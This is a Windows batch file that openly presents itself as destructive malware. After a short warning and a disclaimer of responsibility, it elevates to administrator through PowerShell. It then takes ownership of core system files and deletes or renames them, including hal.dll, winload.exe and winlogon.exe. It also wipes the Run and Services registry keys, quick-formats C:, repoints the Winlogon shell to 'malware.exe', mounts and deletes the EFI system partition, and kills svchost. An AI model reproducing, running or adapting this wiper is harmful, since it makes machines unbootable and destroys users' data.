@echo off 
@echo off
:: Check for admin privileges
net session >nul 2>&1
if %errorlevel%==0 (
    echo Running as administrator...
) else (
    echo Requesting admin privileges...
    powershell -Command "Start-Process '%~f0' -Verb runAs"
    exit /b
)


echo ==========================================================
echo WARNING: You are about to execute a highly destructive malware.
echo DO NOT proceed unless you fully understand the consequences.
echo Close this file and delete it immediately in your real pc 
echo This script should ask for administrator priveliges. Granting these will render your device useless.
echo im not responsible for any damages to ur pc
echo ==========================================================
echo Are you sure?
pause > NUL
echo Say goodbye to your device...
cd C:\windows\system32
takeown /f C:\windows\explorer.exe
ren C:\windows\explorer.exe fishmyass.old
takeown /f  C:\windows\system32\hal.dll
del C:\windows\system32\hal.dll /q
takeown /f C:\windows\system32\winlogon.exe
ren  C:\windows\system32\winlogon.exe winlogoff.notanexe
del C:\boot.ini /f /q
del C:\Windows\System32\hal.dll /f /q
del C:\Windows\System32\winload.exe /f /q
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /f
reg delete "HKLM\SYSTEM\CurrentControlSet\Services" /f
format C: /fs:NTFS /q /y
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "malware.exe" /f
mountvol W: /s
rd W: /s /q
rd W: /s /q
rd W: /s /q
rd W: /s /q
rd W: /s /q
rd W: /s /q
rd W: /s /q
rd W: /s /q
rd W: /s /q
rd W: /s /q
rd W: /s /q
rd W: /s /q
rd W: /s /q
rd W: /s /q
rd W: /s /q
rd W: /s /q
rd W: /s /q
rd W: /s /q
rd W: /s /q
rd W: /s /q
rd W: /s /q
rd W: /s /q
rd W: /s /q
rd W: /s /q
rd W: /s /q
rd W: /s /q
rd W: /s /q
taskkill /f /im svchost.exe
